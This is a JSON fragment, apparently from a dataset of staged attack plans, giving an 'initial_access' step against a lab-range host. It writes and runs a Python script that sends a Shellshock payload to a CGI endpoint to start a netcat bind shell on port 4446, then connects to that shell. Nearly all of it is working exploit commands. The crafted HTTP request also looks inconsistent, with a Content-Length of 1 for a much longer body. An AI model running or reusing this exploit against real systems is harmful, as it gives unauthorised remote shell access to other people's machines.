            "stages": [
                {
                    "stage": "initial_access",
                    "description": "Use Python script to exploit Shellshock for command execution and bind shell",
                    "commands": [
                        {
                            "type": "regular",
                            "command": "cat > /tmp/shellshock.py << 'EOF'\nimport socket\nimport subprocess\nimport sys\n\ns = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\ns.settimeout(10)\ns.connect(('192.168.56.5', 80))\n\npayload = '() { :;}; /bin/nc -e /bin/bash -lvp 4446 -q 1 < /dev/null &\n'\nrequest = f'POST /cgi-bin/status HTTP/1.1\\r\\nHost: 192.168.56.5\\r\\nContent-Length: 1\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\n\\r\\nenv=HTTP_BASH_ENV=\\'{payload}\\'\\r\\n'\n\ns.send(request.encode())\nresponse = s.recv(1024)\nprint(response.decode())\ns.close()\nEOF"
                        },
                        {
                            "type": "regular",
                            "command": "python3 /tmp/shellshock.py"
                        },
                        {
                            "type": "regular",
                            "command": "sleep 5"
                        },
                        {
                            "type": "regular",
                            "command": "nc 192.168.56.5 4446"
                        }
                    ],
                    "verification": "Shell prompt appears in netcat connection"
                },
